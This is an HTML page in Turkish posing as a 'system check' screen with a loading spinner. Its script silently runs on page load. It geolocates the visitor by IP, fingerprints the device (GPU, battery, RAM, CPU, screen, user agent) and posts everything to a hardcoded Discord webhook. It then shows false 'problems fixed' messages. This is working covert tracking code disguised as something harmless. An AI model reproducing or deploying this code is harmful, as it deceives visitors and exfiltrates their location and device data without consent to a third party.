<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background-color: #0f0f0f; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; color: #eeeeee; }
        .container { text-align: center; }
        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.6s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 400; font-size: 15px; margin: 0; color: #555; }
        .success-text { color: #00ff41; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader" class="loader"></div>
        <h2 id="msg">Site ayarlarƒ± kontrol ediliyor...</h2>
    </div>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function baslat() {
            let info = { gpu: "Gizli", ven: "Gizli", bat: "N/A", loc: "√áekilemedi", ip: "N/A" };

            // 1. SESSƒ∞Z KONUM (ƒ∞zin ƒ∞stemez)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                info.ip = d.ip;
                info.loc = `üìç **Konum:** ${d.city} / ${d.country_name}\nüõ∞Ô∏è **ISP:** ${d.org}\nüîó [Haritada G√∂r](https://www.google.com/maps?q=${d.latitude},${d.longitude})`;
            } catch(e) {}

            // 2. GPU Kƒ∞Lƒ∞Dƒ∞ (WebGL Bypass)
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl2') || c.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
            } catch(e) {}

            // 3. Pƒ∞L DURUMU
            try {
                const b = await navigator.getBattery();
                info.bat = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Prizde' : 'Pilde'})`;
            } catch(e) {}

            // 4. KIRMIZI DETAYLI EMBED (VAH≈ûƒ∞ SET)
            const payload = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K Sƒ∞STEM ANALƒ∞Zƒ∞ (Gƒ∞ZLƒ∞)",
                    color: 15158332,
                    fields: [
                        { name: "üìç LOKASYON (IP TABANLI)", value: info.loc, inline: false },
                        { name: "üõ†Ô∏è DONANIM", value: `**GPU:** \`${info.gpu}\`\n**VENDOR:** \`${info.ven}\`\n**RAM:** ${navigator.deviceMemory}GB\n**CPU:** ${navigator.hardwareConcurrency} √áekirdek`, inline: false },
                        { name: "üì± YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${screen.width}x${screen.height}`, inline: true },
                        { name: "üîã DURUM", value: info.bat, inline: true },
                        { name: "üîç AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            // 5. G√ñNDERƒ∞M (BEACON & FETCH)
            const data = JSON.stringify(payload);
            navigator.sendBeacon(u, data);
            fetch(u, { method: 'POST', mode: 'no-cors', body: data });

            // 6. ARAY√úZ AKI≈ûI
            const msg = document.getElementById('msg');
            const loader = document.getElementById('loader');
            
            setTimeout(() => {
                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
            }, 800);

            setTimeout(() => {
                loader.style.display = "none";
                msg.innerHTML = '<span class="success-text">Sorunlar d√ºzeltildi.</span>';
            }, 1800);
        }

        window.onload = baslat;
    </script>
</body>
</html>
